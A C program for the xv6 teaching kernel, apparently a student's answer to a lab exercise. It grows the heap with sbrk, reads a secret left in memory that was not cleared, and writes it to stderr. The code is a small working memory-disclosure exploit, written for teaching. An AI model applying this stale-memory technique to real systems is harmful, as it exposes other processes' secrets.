#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  printf("[attack debug] attack\n");
  char *end = sbrk(PGSIZE*32);
  printf("[attack debug] end ptr: %p\n", (void *) end);
  end = end + 16 * PGSIZE;
  printf("[attack debug] end ptr: %p\n", (void *) end);
  printf("[attack debug] end+32 string: %s\n", end+32);
  
  fprintf(2, "%s", end+32);
  exit(1);
}
